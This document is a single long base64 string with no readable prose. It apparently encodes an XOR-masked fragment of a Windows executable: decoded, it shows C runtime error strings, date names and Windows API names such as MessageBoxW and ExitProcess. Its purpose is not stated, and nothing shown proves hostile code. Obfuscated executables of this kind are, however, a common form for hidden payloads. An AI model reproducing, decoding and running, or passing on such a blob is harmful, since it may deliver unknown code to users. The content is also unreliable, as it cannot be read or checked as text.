3gXYxc3F34XeRd+F2MXfhd2F3sXfhdtF3IXcxcaFx0XFxcXF0UXIRcnFyUXLxcaFx0XOhc3F2IXeRd2F3UXexdyFzcXYxd4FzcXfhd5F34XYxd+F3YXexd+F20Xchc3F38Xchd2F2cXGhcdFxcXFxcXFxcXRRchFycXJRcgFxoXHRc6FzcXeRd4F2MXNxdyF3kXeBdiF3AXfxc3F2QXZxd2F3QXchc3F3EXeBdlFzcXexd4F2AXfhd4FzcXfhd5F34XYxd+F3YXexd+F20XdhdjF34XeBd5FxoXHRcXFxcXFxcXF0UXIRcnFyUXIRcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F2QXYxdzF34XeBc3F34XeRd+F2MXfhd2F3sXfhdtF3YXYxd+F3gXeRcaFx0XFxcXFxcXFxdFFyEXJxclFyIXGhcdFzoXNxdnF2IXZRdyFzcXYRd+F2UXYxdiF3YXexc3F3EXYhd5F3QXYxd+F3gXeRc3F3QXdhd7F3sXGhcdFxcXFxcXF0UXIRcnFyUXIxcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F0gXeBd5F3IXbxd+F2MXOBd2F2MXchdvF34XYxc3F2MXdhd1F3sXchcaFx0XFxcXFxcXFxdFFyEXJxcmFy4XGhcdFzoXNxdiF3kXdhd1F3sXchc3F2MXeBc3F3gXZxdyF3kXNxd0F3gXeRdkF3gXexdyFzcXcxdyF2EXfhd0F3IXGhcdFxcXFxcXFxcXRRchFycXJhcvFxoXHRc6FzcXYhd5F3IXbxdnF3IXdBdjF3IXcxc3F38Xchd2F2cXNxdyF2UXZRd4F2UXGhcdFxcXFxcXFxcXRRchFycXJhcgFxoXHRc6FzcXYhd5F3IXbxdnF3IXdBdjF3IXcxc3F3oXYhd7F2MXfhdjF38XZRdyF3YXcxc3F3sXeBd0F3wXNxdyF2UXZRd4F2UXGhcdFxcXFxcXFxcXRRchFycXJhchFxoXHRc6FzcXeRd4F2MXNxdyF3kXeBdiF3AXfxc3F2QXZxd2F3QXchc3F3EXeBdlFzcXYxd/F2UXchd2F3MXNxdzF3YXYxd2FxoXHRcXF0UXIRcnFyYXJxcaFx0XOhc3F3YXdRd4F2UXYxc/Fz4XNxd/F3YXZBc3F3UXchdyF3kXNxd0F3YXexd7F3IXcxcaFx0XFxcXF0UXIRcnFycXLhcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F3IXeRdhF34XZRd4F3kXehdyF3kXYxcaFx0XFxdFFyEXJxcnFy8XGhcdFzoXNxd5F3gXYxc3F3IXeRd4F2IXcBd/FzcXZBdnF3YXdBdyFzcXcRd4F2UXNxd2F2UXcBdiF3oXchd5F2MXZBcaFx0XFxcXFxcXRRchFycXJxclFxoXHRc6FzcXcRd7F3gXdhdjF34XeRdwFzcXZxd4F34XeRdjFzcXZBdiF2cXZxd4F2UXYxc3F3kXeBdjFzcXexd4F3YXcxdyF3MXGhcdFxcXFxcXFxcXFRcXF+dUFgcfFxcXj1QWBx4XFxdXVBYHHRcXF+9VFgcHFxcXt1UWBwYXFxdXVRYHBRcXF+9WFgcEFxcXt1YWBw8XFxcnVhYHDhcXF/dXFgcNFxcXZ1cWBwwXFxcXVxYHCxcXF6coFgcJFxcXZygWBwgXFxe/KRYHNxcXF1cpFgc2FxcXRysWB28XFxcnKxYHbhcXFwMrFgdtFxcX7ywWB+sXFxfnLBYH6BcXF8csFgdaF34XdBdlF3gXZBd4F3EXYxc3F0EXfhdkF2IXdhd7FzcXVBc8FzwXNxdFF2IXeRdjF34XehdyFzcXWxd+F3UXZRd2F2UXbhcXFxcXHRcdFxcXFxc5FzkXORcXFysXZxdlF3gXcBdlF3YXehc3F3kXdhd6F3IXNxdiF3kXfBd5F3gXYBd5FykXFxcXF0UXYhd5F2MXfhd6F3IXNxdSF2UXZRd4F2UXNhcdFx0XRxdlF3gXcBdlF3YXehctFzcXFxdfF18XLRd6F3oXLRdkF2QXFxcXF3MXcxdzF3MXOxc3F1oXWhdaF1oXNxdzF3MXOxc3F24XbhduF24XFxdaF1oXOBdzF3MXOBduF24XFxcXF0cXWhcXFxcXVhdaFxcXFxdTF3IXdBdyF3oXdRdyF2UXFxcXF1kXeBdhF3IXehd1F3IXZRcXFxcXWBd0F2MXeBd1F3IXZRcXF0QXchdnF2MXchd6F3UXchdlFxcXVhdiF3AXYhdkF2MXFxcXF10XYhd7F24XFxcXF10XYhd5F3IXFxcXF1YXZxdlF34XexcXF1oXdhdlF3QXfxcXF1EXchd1F2UXYhd2F2UXbhcXFxcXXRd2F3kXYhd2F2UXbhcXF1MXchd0FxcXWRd4F2EXFxdYF3QXYxcXF0QXchdnFxcXVhdiF3AXFxddF2IXexcXF10XYhd5FxcXWhd2F24XFxdWF2cXZRcXF1oXdhdlFxcXURdyF3UXFxddF3YXeRcXF0QXdhdjF2IXZRdzF3YXbhcXFxcXURdlF34Xcxd2F24XFxcXF0MXfxdiF2UXZBdzF3YXbhcXFxcXQBdyF3MXeRdyF2QXcxd2F24XFxdDF2IXchdkF3MXdhduFxcXWhd4F3kXcxd2F24XFxcXF0QXYhd5F3MXdhduFxcXFxdEF3YXYxcXF1EXZRd+FxcXQxd/F2IXFxdAF3IXcxcXF0MXYhdyFxcXWhd4F3kXFxdEF2IXeRcXF19fLXp6LWRkFxcXF3Nzc3M7N1paWlo3c3M7N25ubm4XWlo4c3M4bm4XFxcXR1oXF1ZaFxdTcnRyenVyZRcXFxdZeGFyenVyZRcXFxdYdGN4dXJlF0RyZ2NyenVyZRcXF1ZicGJkYxcXXWJ7bhcXFxddYnlyFxcXF1ZnZX57FxcXWnZldH8XFxdRcnVlYnZlbhcXFxdddnlidmVuF1NydBdZeGEXWHRjF0RyZxdWYnAXXWJ7F11ieRdadm4XVmdlF1p2ZRdRcnUXXXZ5F0R2Y2Jlc3ZuFxcXF1FlfnN2bhcXQ39iZWRzdm4XFxcXQHJzeXJkc3ZuFxcXQ2JyZHN2bhdaeHlzdm4XF0RieXN2bhcXRHZjF1FlfhdDf2IXQHJzF0NichdaeHkXRGJ5FxYVFBMSERAfHh0cGxoZGAcGBQQDAgEADw4NDAsKCQg3NjU0MzIxMD8+PTw7Ojk4JyYlJCMiISAvLi0sKyopKFdWVVRTUlFQX15dXFtaWVhHRkVEQ0JBQE9OTUxLSklId3Z1dHNycXB/fn18e3p5eGdmZWRjYmFgb25tbGtqaWgXKhcXFzdUeHpne3JjcjdYdX1ydGM3W3h0dmN4ZTAXFxc3VHt2ZGQ3X35yZXZldH9uN1NyZHRlfmdjeGUwFxcXFzdVdmRyN1R7dmRkN1ZlZXZuMBcXN1V2ZHI3VHt2ZGQ3U3JkdGV+Z2N4ZTd2Yzc/FzdDbmdyN1NyZHRlfmdjeGUwFxcXd3t4dHZ7N2RjdmN+dDdjf2VydnM3cGJ2ZXMwF3d6dnl2cHJzN2FydGN4ZTd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXd2FydGN4ZTdhdXZkcjd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxd3YXJ0Y3hlN3R4Z243dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxd3c255dnp+dDd2Y3JvfmM3c3JkY2VidGN4ZTdxeGU3MBcXFxd3c255dnp+dDd+eX5jfnZ7fm1yZTdxeGU3MBcXd3J/N2FydGN4ZTdhdXZkcjd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBd3cn83YXJ0Y3hlN3R4Z243dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxcXd3p2eXZwcnM3YXJ0Y3hlN3NyZGNlYnRjeGU3fmNyZXZjeGUwFxcXF3d6dnl2cHJzN2FydGN4ZTd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxd3Z3t2dHJ6cnljN3Nye3JjckxKN3R7eGRiZXIwFxcXF3dne3Z0cnpyeWM3c3J7cmNyN3R7eGRiZXIwFxd3eHp5fjd0dnt7ZH5wMBcXN3Nye3JjckxKFxcXN3lyYExKFxd3e3h0dns3YXFjdnV7cjd0eHlkY2VidGN4ZTd0e3hkYmVyMBd3e3h0dns3YXFjdnV7cjAXd0VDQ14XFxd3Ul8Xd2JzYzdlcmNiZXl+eXAwF3d0eGduN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFxd3cn83YXJ0Y3hlN2F1dmRyN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXd3J/N2FydGN4ZTdzcmRjZWJ0Y3hlN35jcmV2Y3hlMBd3cn83YXJ0Y3hlN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxd3YX5lY2J2ezdzfmRne3Z0cnpyeWM3enZnMBcXd2FydGN4ZTdhdXZkcjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXd2FydGN4ZTdzcmRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxd3YXJ0Y3hlN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXF3dkdHZ7dmU3c3J7cmN+eXA3c3JkY2VidGN4ZTAXFxcXd3NycXZie2M3dHh5ZGNlYnRjeGU3dHt4ZGJlcjAXFxd3YXJ0Y3hlN3Nye3JjfnlwN3NyZGNlYnRjeGUwFxcXF3dhdXZkcjdzcmRjZWJ0Y3hlMBcXd2RjZX55cDAXFxcXd3t4dHZ7N2RjdmN+dDdwYnZlczAXFxcXd2NuZ3J4cTAXFxcXd2F0dnt7MBd3YXVjdnV7cjAXFxd3YXFjdnV7cjAXFxdJKhcXayoXFzEqFxcrKyoXKSkqFzIqFxc4KhcXOioXFzwqFxc9KhcXa2sXFzExFxdrFxcXSRcXF2kXFxc/PhcXOxcXFykqFxcpFxcXKyoXFysXFxcyFxcXOik9FzEXFxc8FxcXOhcXFzo6Fxc8PBcXPRcXFzopFxd4Z3JldmN4ZRcXFxdMShcXNioXFyoqFxc2FxcXKysXFykpFxc3c3J7cmNyFzd5cmAXFxcXSEhieXZ7fnB5cnMXSEhlcmRjZX50YxcXSEhnY2UhIxdISHJ2dX4XF0hIdHtldHZ7excXF0hIcXZkY3R2e3sXF0hIY39+ZHR2e3sXF0hIZGNzdHZ7excXF0hIZ3ZkdHZ7FxcXF0hIdHNydHsXSEh1dmRycz8XFxcXM1gWBwtYFgcHWBYHE1gWB+9ZFgf7WRYH91kWB89ZFgfHWRYH01kWB69ZFgfOIRYHp1kWB79ZFgeHXhYHs1kWB7dZFgeLWRYHj1kWB4NZFgeHWRYHk1kWB5dZFgdrWRYHb1kWB2NZFgdnWRYHe1kWB39ZFgdzWRYH5yEWB3dZFgdLWRYHT1kWB0NZFgdHWRYHW1kWB19ZFgdTWRYHV1kWBytZFgcvWRYHI1kWBydZFgc7WRYHP1kWBzNZFgc3WRYHC1kWBw9ZFgcDWRYHB1kWBxtZFgcXWRYH41oWB/taFgf3WhYH31oWB6taFge/WhYHn1oWB39aFgdfWhYHP1oWBx9aFgfzWxYH31sWB7NbFgeTWxYHS1sWB1dbFgcnWxYHO1sWBzNbFgcDWxYH51wWB/9cFgfLXBYH21wWB6dcFgeHXBYHf1wWB1dcFgcPXBYH+10WB8ddFge7XRYHn10WB0tdFgcnXRYHA10WB84hFgcXXRYH814WB8deFgenXhYHg14WBxcXFxcRl5eRl5aXFxcHFJGXkZWXAxISUlJSkpKSEhcXJyeXR5efFx8XPzAvR0CXFxAXICcnR0efFxcXNz+Xn5eXFxcXd393f39/Hx8Qb2dnYGdnHx8XFx8XHxcQHxcXF1ByY0dleHRyZGRAfnlzeGBEY3Zjfnh5F1ByY0JkcmVYdX1ydGNeeXF4ZXp2Y354eUAXFxdQcmNbdmRjVnRjfmFyR3hnYmcXF1ByY1Z0Y35hckB+eXN4YBdacmRkdnByVXhvQBdCF0QXUhdFFyQXJRc5F1MXWxdbFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXNxc3FzcXNxc3FzcXNxc3FzcXPxc/Fz8XPxc/FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3F18XBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXkxeTF5MXkxeTF5MXkxeTF5MXkxcHFwcXBxcHFwcXBxcHF5YXlheWF5YXlheWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcHFwcXBxcHFwcXBxeVF5UXlReVF5UXlRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXBxcHFwcXBxc3FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFzcXNxc3FzcXNxc3FzcXNxc3F38XPxc/Fz8XPxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxdfFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHF5MXkxeTF5MXkxeTF5MXkxeTF5MXBxcHFwcXBxcHFwcXBxeWFpYWlhaWFpYWlhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWBxcHFwcXBxcHFwcXlRaVFpUWlRaVFpUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFgcXBxcHFwcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXXxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXAxcDFwcXBxcHFwcXBxcDFwcXBxcHFwcXBxcHFxYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYHFxYWFhYWFhYWFhYWFhYWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWBxcVFhUWFRYVFhUWFRYVFhUWFhYXFxcXl5aVlJOSkZCfnp2cm5qZmIeGhYSDgoGAj46NjIuKiYi3trW0s7KxsL++vby7urm4p6alpKOioaCvrq2sq6qpqNfW1dTT0tHQ397d3Nva2djHxsXEw8LBwM/OzczLysnI9/b19PPy8fD//v38+/r5+Ofm5eTj4uHg7+7t7Ovq6egXFhUUExIREB8eHRwbGhkYBwYFBAMCAQAPDg0MCwoJCDc2NTQzMjEwPz49PDs6OTgnJiUkIyIhIC8uLSwrKikoV3Z1dHNycXB/fn18e3p5eGdmZWRjYmFgb25tTEtKSUh3dnV0c3JxcH9+fXx7enl4Z2ZlZGNiYWBvbm1sa2ppaJeWlZSTkpGQn56dnJuamZiHhoWEg4KBgI+OjYyLiomIt7a1tLOysbC/vr28u7q5uKempaSjoqGgr66trKuqqajX1tXU09LR0N/e3dzb2tnYx8bFxMPCwcDPzs3My8rJyPf29fTz8vHw//79/Pv6+fjn5uXk4+Lh4O/u7ezr6unol5aVlJOSkZCfnp2cm5qZmIeGhYSDgoGAj46NjIuKiYi3trW0s7KxsL++vby7urm4p6alpKOioaCvrq2sq6qpqNfW1dTT0tHQ397d3Nva2djHxsXEw8LBwM/OzczLysnI9/b19PPy8fD//v38+/r5+Ofm5eTj4uHg7+7t7Ovq6egXFhUUExIREB8eHRwbGhkYBwYFBAMCAQAPDg0MCwoJCDc2NTQzMjEwPz49PDs6OTgnJiUkIyIhIC8uLSwrKikoV1ZVVFNSUVBfXl1cW1pZWEdGRURDQkFAT05NTEtKSUh3VlVUU1JRUF9eXVxbWllYR0ZFRENCQUBPTk1sa2ppaJeWlZSTkpGQn56dnJuamZiHhoWEg4KBgI+OjYyLiomIt7a1tLOysbC/vr28u7q5uKempaSjoqGgr66trKuqqajX1tXU09LR0N/e3dzb2tnYx8bFxMPCwcDPzs3My8rJyPf29fTz8vHw//79/Pv6+fjn5uXk4+Lh4O/u7ezr6unoVBdYF1kXWBdCF0MXMxcXF18XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF8eVFgdHSxYHDxcXFxcXFxcXFxcXFxcXF+OWFgcTTRYHFxcXFxcXFxcVFxcXA00WBzdNFgcrTRYHFxcXF+OWFgcWFxcXFxcXF+jo6OgXFxcXVxcXFxNNFgcHlRYHFxcXFxcXFxfo6OjoFxcXF1cXFxdPTRYHFxcXFxcXFxcWFxcXf00WBytNFgcXFxcXFxcXFxcXFxcXFxcXO5UWB5NNFgcXFxcXFxcXFxYXFxeDTRYHi00WBxcXFxc7lRYHFxcXFxcXFxfo6OjoFxcXF1cXFxeTTRYHFxcXFxcXFxcXFxcXX5UWB9tNFgcXFxcXFxcXFxUXFxfLTRYH/00WBytNFgcXFxcXX5UWBxYXFxcXFxcX6Ojo6BcXFxdXFxcX200WBxcXFxcXFxcXFxcXF3+VFgcPTBYHFxcXFxcXFxcUFxcXP0wWBy9MFgf/TRYHK00WBxcXFxd/lRYHFRcXFxcXFxfo6OjoFxcXF1cXFxcPTBYHFxcXFxcXFxcXFxcXn5UWB39MFgcXFxcXFxcXFxQXFxdvTBYHn0wWB/9NFgcrTRYHFxcXF5+VFgcVFxcXFxcXF+jo6OgXFxcXVxcXF39MFgcXFxcXFxcXFxcXFxcHlRYHT00WBxcXFxcXFxcXFxcXF6eVFgfbTBYHFxcXFxcXFxcWFxcXy0wWB/NMFgcXFxcXp5UWBxcXFxcXFxcX6Ojo6BcXFxdXFxcX20wWBxcXFxcXFxcXFxcXFzeQFgcDSxYHFxcXFxcXFxcVFxcXM0sWBydLFgcrTRYHFxcXFzeQFgcWFxcXFxcXF+jo6OgXFxcXVxcXFwNLFgcXFxcXW3oXF0F5Fxd3mRcXd7MXF0foFxdXDRYXjg0WF88NFhcPDBYXRwwWF5cMFheuDBYX7gwWF9ILFhcfChYXXwoWF4cKFhf2ChYXLgkWF+cJFhcpCBYXhggWF/YIFhceNxYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXBxcHFxcXF8dLFgcVFxcXy0sWB+9LFgcXFxcX45YWBxcXFxfo6OjoFxcXFxsXFxd3BhcHFxcXFweVFgcXFxcX6Ojo6BcXFxcbFxcXynYXB1cXFxcXFxcXFxcXF2QEFwdXFxcXFxcXFxcXFxfsBBcH6Ojo6BcXFxfo6OjoFxcXFxYXFxcXFxcXFhcXFxcXFxc1EoQOExcXFyNKFgcVFxcXb0oWBxcXFxcXFxcXFxcXFxYXFxcVFxcXFRcXFxQXFxcWFxcXM0oWBxcXFxcXFxcXFBcXFxYXFxcDShYHNRKEDhEXFxfTShYHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6HcNFgcXFxcXfA0WBxYXFxdkDRYHFRcXF2kNFgcXFxcXng0WBxcXFxeGDRYH6Ojo6McNFgc1EoQOFhcXF+NKFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoFwwWBxcXFxcfDBYHFhcXFwcMFgc1EoQOFBcXFzdJFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoVwwWBxcXFxdfDBYHNRKEDhUXFxdLSRYHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6GcMFgcXFxcXbwwWBzUShA4VFxcXh0kWBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXF+jo6Oi3DBYHNRKEDhYXFxfTSRYHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6PcMFgc1EoQOFhcXF+dJFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxc1EoQOGBcXF1dIFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoNwsWBxcXFxc8CxYHFhcXFyELFgfo6OjoVgsWBxQXFxdbCxYHExcXF0ALFgfo6OjodQsWBxEXFxd6CxYHEBcXF28LFgcfFxcXlAsWBxEXFxeZCxYH6Ojo6I4LFgccFxcXswsWBxsXFxe4CxYHGhcXF60LFgfo6Ojo5wsWBxcXFxfvCxYHFhcXFxcKFgc1EoQOFBcXF69IFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoJwoWBxcXFxcvChYHFhcXF1cKFgc1EoQOFBcXF+NIFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoZwoWBxcXFxdvChYHFhcXF5cKFgcWFxcXnwoWBzUShA4TFxcXJ3cWBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXF+jo6OjfChYHFxcXF9cKFgc1EoQOFRcXF2N3FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoBwkWBxcXFxc+CRYHFxcXFyYJFgc1EoQOFBcXF793FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxc1EoQOGxcXFx92FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjodwkWBxcXFxd8CRYHFhcXF2EJFgcVFxcXlgkWBxQXFxebCRYHExcXF40JFgcSFxcXvwkWBxEXFxehCRYHEBcXF9MJFgcfFxcXxQkWBx4XFxf3CRYHHhcXF/8JFgfo6OjoNwgWBxcXFxc/CBYHFxcXFyQIFgc1EoQOFBcXF392FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoZwgWBxcXFxeRCBYHFxcXF2wIFgc1EoQOFBcXF7N2FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6Ojo1wgWB+jo6OjcCBYHFhcXF8EIFgc1EoQOFBcXF/d2FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxcXFxcXX5UWBxcXFxfo6OjoFxcXFxsXFxcnSRcHFxcXFzxJFwcXFxcXX3UWBxQXFxdPdRYHC3UWB+9LFgcXFxcXf5UWBxcXFxfo6OjoFxcXFxsXFxdqSRcHFxcXFzxJFwcXFxcXk3UWBxQXFxeDdRYHC3UWB+9LFgcXFxcXn5UWBxcXFxfo6OjoFxcXFxsXFxfdSRcH6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXAX0XBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxfEfRcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoqGcXB8RnFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXw2EXBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxf9bxcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF+duFwcXFxcX6ejo6BcXFxfb6OjoFxcXF+no6OgXFxcXbGwXBxcXFxcXFxcXUGwXB+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXFztrFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXdZYXBxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6BcXFxdUlRcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjotJQXB6OUFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXpZIXBxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxehnhcHFxcXF+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXF6K0FwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXtLAXBxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxeEvhcHFxcXF0K+FwdIvhcH6ejo6BcXFxfP6OjoFxcXF+no6OgsvRcHU70XB1cXFxcXFxcXFxcXFwq8Fwfo6OjoFxcXF+jo6OgXFxcXFxcXFxcXFxcWFxcXFhcXF8tzFgc1EoQOFRcXF/tzFgcWFxcX63MWBxcXFxcXFxcXFxcXFxYXFxcXFxcX6ejo6BcXFxej6OjoFxcXF+no6OgXFxcXQrsXBxcXFxfSvBcH2bwXB+no6OgXFxcXw+jo6BcXFxfp6OjoK7kXB1e5FwcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6OjCuRcHzrkXBxcXFxfgsBcHFxcXF7tyFgcVFxcXr3IWB+9LFgcXFxcXN5AWBxcXFxfo6OjoFxcXFxsXFxfbpBcHFxcXF+no6OgXFxcXz+jo6BcXFxfp6OjoFxcXFzyhFwfp6OjoFxcXFy2hFwfp6OjoFxcXF8/o6OgXFxcX6ejo6BcXFxf6oBcH6ejo6BcXFxfuoBcH6ejo6BcXFxfP6OjoFxcXF+no6OgZrRcHBa0XBxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6EmtFwd1rRcHFxcXF+no6OgXFxcX1+jo6BcXFxfp6OjoFxcXF12qFwcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXqN0XBxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxdq2xcHFxcXF+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXF1nDFwcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXMMIXBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxe0wRcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF83MFwcXFxcX6ejo6BcXFxfb6OjoFxcXF+no6OgXFxcXu8gXBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxcn9BcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF1P6FwcXFxcX6ejo6BcXFxff6OjoFxcXF+no6OgXFxcXHvgXBxcXFxcXFxcXUvkXB+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXF7L4FwcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6Ojc5xcHyecXBxcXFxfp6OjoFxcXF9vo6OgXFxcX6ejo6BcXFxdd7BcHFxcXF+no6OgXFxcX2+jo6BcXFxfp6OjoFxcXF9sWFgcXFxcX6ejo6BcXFxfX6OjoFxcXF+no6OgXFxcXhxMWBwN+FhcXFxcXFxcXF7t8FhcLJxYX738WFxcXFxcXFxcXGXsWFxcnFhdrfRYXFxcXFxcXFxc7exYXkyYWF0t9FhcXFxcXFxcXF9F7FhdzJhYXG34WFxcXFxcXFxcX83sWFwMnFhdDfRYXFxcXFxcXFxcTehYXSyYWFxcXFxcXFxcXFxcXFxcXFxcXFxcXF3sWF/t8FhfZfBYXrXwWFxcXFxfFexYXFxcXFw98Fhc/fBYXKXwWF1t8FhdNfBYXcXwWF298FheRfBYXgXwWF0NmFhcdfBYX4X0WF/99FhfPfRYXq30WF6N9FhexfRYXgX0WFyVmFhc1ZhYXA2YWFxNmFhdTZhYXk30WF+9nFhf9ZxYXB3oWFz16FhcrehYXX3oWF0F6Fhd7ehYXa3oWF596FheDehYXs3oWF6F6FhfFehYX8XoWFxV5Fhc3eRYXI3kWF1N5FhdLeRYXY3kWF5F5FheBeRYXqXkWF9t5FhfJeRYX4XkWFxV4FhcHeBYXCXgWFz94FhdXeBYXQ3gWF3N4FhdreBYXhXgWF4l4FhejeBYX03gWF8F4Fhf9eBYX73gWFxFnFhcLZxYXP2cWFyVnFhcpZxYXR2cWF3dnFhdhZxYXh2cWF71nFhfTZxYXzWcWF3FmFhcXFxcX5XsWFxcXFxefexYXIXsWF4l7Fhd3exYXY3sWF6d7FhddexYXFxcXFwt7FhcXFxcXUhVQcmNHZXh0VnNzZXJkZBcXKxRbeHZzW351ZXZlblYXFw4WUm9+Y0dleHRyZGQXpRNEe3JyZxcLFlJvZ3Z5c1J5YX5leHl6cnljRGNlfnlwZFYXFRVQcmNbdmRjUmVleGUXF0UXVHt4ZHJfdnlze3IX1xZQcmNUYmVlcnljR2V4dHJkZBdIFlFlcnJUeHlkeHtyFxQVUHJjW3h0dntDfnpyFxfuE0B2fmNReGVEfnlwe3JYdX1ydGMXxBdTcntyY3JRfntyVhd1FlFlcnJbfnVldmVuF9cURXJ2c1F+e3IXF3ETRHJjUX57ckd4fnljcmUXF+cWUHJjUX57ckR+bXIXhBVQcmNDfnR8VHhieWMXF54UWGJjZ2JjU3J1YnBEY2V+eXBWFxdcUkVZUlskJTlze3sXF9cVRHJjRHJlYX50ckRjdmNiZBcXnxVFcnB+ZGNyZURyZWF+dHJUY2V7X3Z5c3tyZUAXehVFcnBGYnJlbkF2e2JyUm9WFxcnFUVycFR7eGRyXHJuF1ZTQVZHXiQlOXN7excXGBdUeFRlcnZjclBifnMXF3h7ciQlOXN7exdmF155Y3JleXJjVHh5eXJ0Y1YXF3wXXnljcmV5cmNUe3hkcl92eXN7chdMF